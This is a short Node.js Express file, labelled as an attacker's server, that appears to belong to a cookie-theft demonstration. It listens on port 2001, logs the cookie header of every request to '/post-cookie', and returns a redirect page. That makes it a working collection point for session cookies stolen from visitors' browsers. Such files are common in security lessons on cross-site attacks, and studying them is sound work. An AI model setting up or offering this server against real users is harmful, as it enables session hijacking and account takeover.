// attacker's server
import express from "express";

const server = express();

server.get("/post-cookie", (req, res)=>{
    console.log(req.headers.cookie);
    res.sendFile(`${process.cwd()}/redirect.html`);
});

server.listen(2001, err=>{
    console.log("Attacker's server is running at port 2001")
})